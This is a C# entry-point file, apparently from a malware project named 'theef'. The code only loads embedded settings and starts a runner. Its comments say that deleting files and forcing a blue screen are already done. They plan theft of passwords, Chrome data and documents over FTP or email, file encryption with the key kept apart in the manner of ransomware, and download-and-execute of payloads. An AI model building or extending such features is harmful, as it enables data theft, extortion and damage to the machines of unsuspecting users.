using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;

namespace theef
{
    class Program
    {
        static void Main(string[] args)
        {
            /* Done:
             * - (bad) config file
             * - Message box
             * - Delete file
             * - bsod
             */

            /* TODO features:
             * - Quick Auto Remote Backup (Passwords, Chrome, Documents, Pictures)
             *      - "Smart" backup, checks file types/size to ensure files are not too big
             *      - FTP
             *      - Email
             * 
             * - File encryptor/decryptor (documents, pictures, ...)
             *      - Store private key somewhere safe.
             * 
             * - Download and execute/open file(s)
             *      - Delay
             *      - Directory to download to
             *      - Download to memory?
             */
             
            /* TODO Functionality:
             *  - Multi threading
             *  - Module based features
             *  - Frontend for making the config file.
             *  - Change config format so it is not terrible. Json?
             *  - Change config parser so if you don't want something enabled you just don't include it.
             */

            // Load the parts array into the settings class.
            Settings settings = new Settings(Properties.Resources.Settings.Split(':'));

            // Run the operations.
            new Runner(settings);
        }
    }
}
